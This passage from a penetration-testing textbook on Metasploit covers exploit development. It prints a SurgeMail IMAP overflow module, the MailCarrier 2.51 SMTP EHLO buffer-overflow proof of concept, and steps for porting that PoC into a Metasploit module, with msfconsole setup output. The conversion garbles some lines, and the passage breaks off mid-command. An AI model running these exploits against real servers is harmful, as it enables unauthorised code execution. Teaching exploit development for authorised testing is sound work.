</a>&#39;http://www.exploit-db.com/exploits/5259&#39; ],</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;text-align: left;">&#39;Privileged&#39; =&gt; false, &#39;DefaultOptions&#39; =&gt;</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;EXITFUNC&#39; =&gt; &#39;thread&#39;,</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Payload&#39; =&gt;</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Space&#39; =&gt; 10351,</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DisableNops&#39; =&gt; true,</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;BadChars&#39; =&gt; &quot;\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b&quot;</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Platform&#39; =&gt; &#39;win&#39;,</p><p class="s25" style="padding-left: 99pt;text-indent: -15pt;text-align: left;">&#39;Targets&#39; =&gt; [</p><p class="s25" style="padding-left: 114pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;Windows Universal&#39;, { &#39;Ret&#39; =&gt; &quot;\x7e\x51\x78&quot; } ], # p/p/r in surgemail.exe</p><p class="s25" style="padding-left: 99pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p class="s25" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;DisclosureDate&#39; =&gt; &#39;March 13 2008&#39;,</p><p class="s25" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DefaultTarget&#39; =&gt; 0))</p><p class="s25" style="padding-top: 3pt;padding-left: 52pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connected = connect_login</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;text-align: left;">lead = &quot;\x90&quot; * (10351 - payload.encoded.length) near = &quot;\xe9\xdd\xd7\xff\xff&quot;</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;line-height: 10pt;text-align: left;">nseh = &quot;\xeb\xf9\x90\x90&quot;</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;text-align: left;">evil = lead + payload.encoded + near + nseh + [target.ret].pack(&quot;A3&quot;) print_status(&quot;Sending payload&quot;)</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;text-align: left;">sploit = &#39;0002 LIST () &quot;/&#39; + evil + &#39;&quot; &quot;PWNED&quot;&#39; + &quot;\r\n&quot; sock.put(sploit)</p><p class="s25" style="padding-left: 67pt;text-indent: 0pt;text-align: left;">handler disconnect</p><p class="s25" style="padding-left: 52pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_583.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark387">Wrapping Up</a><a name="bookmark395">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Although we haven’t uncovered a new vulnerability in this chapter, we have covered the entire process from developing and running a fuzzer to developing a functioning exploit. The exploit that we built in this chapter is complicated and unusual, and it therefore offers an excellent opportunity to think beyond the basics and explore creative avenues to obtain code execution.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">One of the best ways to dig deeper into Metasploit is to read through the Metasploit source files and other exploit modules to get a better idea of what is possible within the Metasploit Framework. The techniques in this chapter have given you the basic tools you’ll need to begin discovering vulnerabilities and developing Metasploit exploit modules that will take advantage of them.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the next chapter we will begin to dive into porting exploits into the Framework that will build upon the knowledge you learned in this chapter. We’ll show you how to convert publicly available exploits into a working Metasploit exploit by rewriting the exploit and debugging it to see what it’s doing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="132" height="123" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_584.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 9pt;padding-left: 123pt;text-indent: -5pt;line-height: 87%;text-align: left;"><a name="bookmark396">PORTING EXPLOITS TO THE METASPLOIT FRAMEWORK </a><a name="bookmark412">&zwnj;</a><a name="bookmark413">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 89pt;text-indent: 1pt;text-align: left;">You can choose to convert exploits to Metasploit from a different format for many reasons, not the least of which is to give back to the community and the Frame- work. Not all exploits are based on the Metasploit Frame- work; some are programmed in Perl and Python or C and C++.</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When you port exploits to Metasploit, you convert an existing stand- alone exploit, such as a Python or Perl script, for use within Metasploit. And, of course, after you have imported an exploit into the Framework, you can leverage the Framework’s many high-end tools to handle routine tasks, so that you can concentrate on what is unique about your particular exploit. In addition, although stand-alone exploits often depend on your using a certain payload or operating system, once ported to the Framework, payloads can be created on the fly and the exploit can be used in multiple scenarios.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">This chapter will walk you through the process of porting two stand-alone exploits to the Framework. With your knowledge of these basic concepts and a bit of hard work on your part, you should be able to begin porting exploits into the Framework yourself by the end of this chapter.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark397">Assembly Language Basics</a><a name="bookmark414">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To get the most out of this chapter, you’ll need a basic understanding of the assembly programming language. We use a lot of low-level assembly language instructions and commands in this chapter, so let’s take a look at the most common ones.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark398">EIP and ESP Registers</a><a name="bookmark415">&zwnj;</a></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Registers <span class="p">are placeholders that store information, perform calculations, or hold values that an application needs in order to run. The two most impor- tant registers for the purposes of this chapter are </span>EIP<span class="p">, the extended instruc- tion pointer register, and </span>ESP<span class="p">, the extended starter pointer register.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The value in EIP tells the application where to go after it has executed some code. In this chapter, we’ll overwrite our EIP return address and tell it to point to our malicious shellcode. The ESP register is where, in our buffer overflow exploit, we would overwrite the normal application data with our malicious code to cause a crash. The ESP register is essentially a memory address and placeholder for our malicious shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark399">The JMP Instruction Set</a><a name="bookmark416">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The <span class="s19">JMP instruction set </span>is the “jump” to the ESP memory address. In the over- flow example that we’ll explore in this chapter, we use the JMP ESP instruction set to tell the computer to go to the ESP memory address that happens to contain our shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark400">NOPs and NOP Slides</a><a name="bookmark417">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">A <span class="s19">NOP </span>is a no-operation instruction. Sometimes when you trigger an over- flow, you won’t know exactly where you’re going to land within the space allo- cated. A NOP instruction simply says to the computer “Don’t do anything if you see me,” and it is represented by a \x90 in hexadecimal.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">A <span class="s19">NOP slide </span>is a handful of NOPs, combined to create a slide to our shellcode. When we go through and actually trigger the JMP ESP instructions, we will hit a bunch of NOPs, which will slide down until we hit our shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark401">Porting a Buffer Overflow</a><a name="bookmark418">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Our first example is a typical remote buffer overflow that needs only a jump to the extended stack pointer (JMP ESP) instruction to reach the shellcode. This exploit, called the “MailCarrier 2.51 SMTP EHLO / HELO Buffer Over- flow Exploit,” uses MailCarrier 2.51 SMTP commands to cause a buffer overflow.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <a href="http://www.exploit-db.com/" class="s20" target="_blank">You’ll find the exploit and a vulnerable application at </a><span class="p">http://www.exploit-db.com/ exploits/598/</span><span class="s19">.</span></p><p class="s19" style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.exploit-db.com/download_pdf/" class="s31" target="_blank">But this is an older exploit, originally written for Windows 2000. When you run it now, it doesn’t work quite as you’d expect. Conveniently, a Meta- sploit module is already in the Framework to implement this exploit, although it could use some improvement. After a little time investigating with varying buffer lengths, you will find that more than 1000 bytes are available for shellcode, and the buffer length needs to be adjusted by 4 bytes. (For more information on how this is accomplished, read “Exploit Writing Tutorial Part 1: Stack Based Overflows,” at </a>http://www.exploit-db.com/download_pdf/ 13535/<span class="p">.) The new proof of concept for this exploit follows: We have removed the shellcode and replaced the jump instruction with a string (</span>AAAA<span class="p">) to overwrite the EIP register. (Proof of concept exploits contain the basic code necessary to demonstrate the exploit but do not carry an actual payload, and in many cases they require heavy modifications before they will work properly.)</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_585.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">#!/usr/bin/python #########################################################</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;"># MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow # # Advanced, secure and easy to use Mail Server. # # 23 Oct 2004 - muts #</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#########################################################</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">import struct import socket</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print &quot;\n\n###############################################&quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">print &quot;\nMailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow&quot; print &quot;\nFound &amp; coded by muts [at] whitehat.co.il&quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">print &quot;\nFor Educational Purposes Only!\n&quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print &quot;\n\n###############################################&quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 21pt;text-align: left;">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) buffer = &quot;\x41&quot; * 5093</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">buffer += &quot;\42&quot; * 4 buffer += &quot;\x90&quot; * 32 buffer += &quot;\xcc&quot; * 1000</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">try:</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;text-align: left;">print &quot;\nSending evil buffer...&quot; s.connect((&#39;192.168.1.155&#39;,25))</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;text-align: left;">s.send(&#39;EHLO &#39; + buffer + &#39;\r\n&#39;) data = s.recv(1024)</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;line-height: 10pt;text-align: left;">s.close()</p><p class="s25" style="padding-left: 90pt;text-indent: 16pt;text-align: left;">print &quot;\nDone!&quot; except:</p><p class="s25" style="padding-bottom: 3pt;padding-left: 107pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print &quot;Could not connect to SMTP!&quot;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_586.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As you might imagine, the easiest and fastest way to port a stand-alone exploit to Metasploit is to modify a similar one from the Framework. And that’s what we’ll do next.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark402">Stripping the Existing Exploit</a><a name="bookmark419">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">As our first step in porting the MailCarrier exploit, we’ll strip down the exist- ing Metasploit module to a simple skeleton file, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_587.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 70pt;text-indent: -34pt;text-align: left;">class Metasploit3 &lt; Msf::Exploit::Remote Rank = GoodRanking</p><p class="s30" style="padding-left: 91pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O<span class="s25">include Msf::Exploit::Remote::Tcp</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 87pt;text-indent: -17pt;text-align: left;">def initialize(info = {}) super(update_info(info,</p><p class="s25" style="padding-left: 134pt;text-indent: -21pt;text-align: left;">&#39;Name&#39; =&gt; &#39;TABS MailCarrier v2.51 SMTP EHLO Overflow&#39;, &#39;Description&#39; =&gt; %q{</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 10pt;text-align: left;">This module exploits the MailCarrier v2.51 suite SMTP service.</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The stack is overwritten when sending an overly long EHLO command.</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;text-align: left;">&#39;Author&#39; =&gt; [ &#39;Your Name&#39; ], &#39;Arch&#39; =&gt; [ ARCH_X86 ],</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;text-align: left;">&#39;License&#39; =&gt; MSF_LICENSE, &#39;Version&#39; =&gt; &#39;$Revision: 7724 $&#39;, &#39;References&#39; =&gt;</p><p class="s25" style="padding-left: 138pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s25" style="padding-left: 163pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;CVE&#39;, &#39;2004-1638&#39; ],</p><p class="s25" style="padding-left: 163pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[ &#39;OSVDB&#39;, &#39;11174&#39; ],</p><p class="s25" style="padding-left: 163pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[ &#39;BID&#39;, &#39;11535&#39; ],</p><p class="s25" style="padding-left: 163pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://www.exploit-db.com/exploits/598%27" class="s34" target="_blank">[ &#39;URL&#39;, </a>&#39;http://www.exploit-db.com/exploits/598&#39; ],</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Privileged&#39; =&gt; true,</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DefaultOptions&#39; =&gt;</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p class="s25" style="padding-left: 30pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&#39;EXITFUNC&#39;     =&gt; &#39;thread&#39;,</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Payload&#39; =&gt;</p><p class="s25" style="padding-left: 163pt;text-indent: 0pt;line-height: 11pt;text-align: left;">{</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 8pt;padding-left: 163pt;text-indent: 0pt;text-align: left;">},</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 10pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Space&#39; =&gt; 300,</p><p class="s25" style="padding-left: 10pt;text-indent: 0pt;text-align: left;">&#39;BadChars&#39; =&gt; &quot;\x00\x0a\x0d\x3a&quot;, &#39;StackAdjustment&#39; =&gt; -3500,</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;text-align: left;">&#39;Platform&#39; =&gt; [&#39;win&#39;], &#39;Targets&#39; =&gt;</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s25" style="padding-left: 185pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><span class="s30">8</span>[ &#39;Windows XP SP2 - EN&#39;, { &#39;Ret&#39; =&gt; <span class="s24">0xdeadbeef </span>} ],</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 10pt;text-align: left;">],</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;DisclosureDate&#39; =&gt; &#39;Oct 26 2004&#39;,</p><p class="s25" style="padding-left: 134pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DefaultTarget&#39; =&gt; 0))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 138pt;text-indent: -4pt;text-align: left;">register_options( [</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 12pt;text-align: center;"><span class="s30">@</span>Opt::RPORT(<span class="s24">25</span>),</p><p class="s25" style="padding-left: 163pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Opt::LHOST(), # Required for stack offset</p><p class="s25" style="padding-top: 3pt;padding-left: 138pt;text-indent: 0pt;line-height: 11pt;text-align: left;">], self.class)</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-top: 2pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">O<span class="s25">sock.put(sploit + &quot;\r\n&quot;)</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">handler disconnect</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_588.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">Because this exploit does not require authentication, we need only the mixin <span class="s25">Msf::Exploit::Remote::Tcp </span>shown at <span class="s32">O</span>. We’ve discussed mixins in previ- ous chapters; you’ll recall that mixins allow you to use built-in protocols such</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">as <span class="s25">Remote::Tcp </span>to perform basic remote TCP communications.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 83%;text-align: justify;">In the preceding listing, the target return address is set to the bogus value <span class="s25">Oxdeadbeef </span>at <span class="s32">8</span>, and the default TCP port is set to <span class="s25">25 </span>at <span class="s32">@</span>. Upon connecting to the target, Metasploit will send the malicious attack using <span class="s25">sock.put </span>as shown at <span class="s32">O </span>and craft our exploit for us.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark403">Configuring the Exploit Definition</a><a name="bookmark420">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Let’s look at how we initially configure our exploit definition. We will need to feed the service a greeting as required by the protocol, a large buffer, a placeholder where we will take control of EIP, a brief NOP slide, and a place- holder for our shellcode. Here’s the code:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_589.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 112pt;text-indent: 0pt;line-height: 71%;text-align: left;"><span class="s30">O</span>sploit = &quot;<span class="s24">EHLO </span>&quot; <span class="s30">8</span>sploit &lt;&lt; &quot;\x41&quot; * <span class="s24">5093 </span><span class="s30">@</span>sploit &lt;&lt; &quot;\x42&quot; * <span class="s24">4 </span><span class="s30">O</span>sploit &lt;&lt; &quot;<span class="s24">\x90</span>&quot; * 32 <span class="s30">@</span>sploit &lt;&lt; &quot;<span class="s24">\xcc</span>&quot; * 1000</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;text-align: left;">sock.put(sploit + &quot;\r\n&quot;)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 4pt;padding-left: 120pt;text-indent: 0pt;text-align: left;">handler disconnect</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_590.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 73%;text-align: left;">The malicious buffer is built based on the original exploit code begin- ning with the <span class="s25">EHLO </span>command at <span class="s32">O </span>followed by a long string of <span class="s19">A</span>s at <span class="s32">8 </span>(5093 of them), 4 bytes to overwrite the EIP register at <span class="s32">@</span>, a small NOP slide at <span class="s32">O</span>, and then some dummy shellcode at <span class="s32">@</span>.</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">In this case, we’ve selected an interrupt (breakpoint) at <span class="s32">@ </span>so that execution will pause when it reaches our shellcode without us having to set a breakpoint.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Having configured the exploit section, we save the file as <span class="s19">mailcarrier_book.rb</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">at <span class="s19">modules/exploits/windows/smtp/</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark404">Testing Our Base Exploit</a><a name="bookmark421">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In the next step, we load the module in <span class="s19">msfconsole</span>, set the required options, and configure a payload of <span class="s25">generic/debug_trap </span>(a great payload for exploit development that triggers a stop point when you are tracing the application in a debugger). Then we run the module:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_591.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use exploit/windows/smtp/mailcarrier_book</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mailcarrier_book) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:103.22pt" cellspacing="0"><tr style="height:16pt"><td style="width:30pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:79pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:30pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">LHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:79pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The local address</p></td></tr><tr style="height:11pt"><td style="width:30pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:79pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:10pt"><td style="width:30pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">RPORT</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">25</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:79pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The target port</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_592.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_593.png"/></span></p><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit target: Id Name</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;line-height: 11pt;text-align: left;">0 Windows XP SP2 - EN</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mailcarrier_book) &gt; <span class="s24">set LHOST 192.168.1.101</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 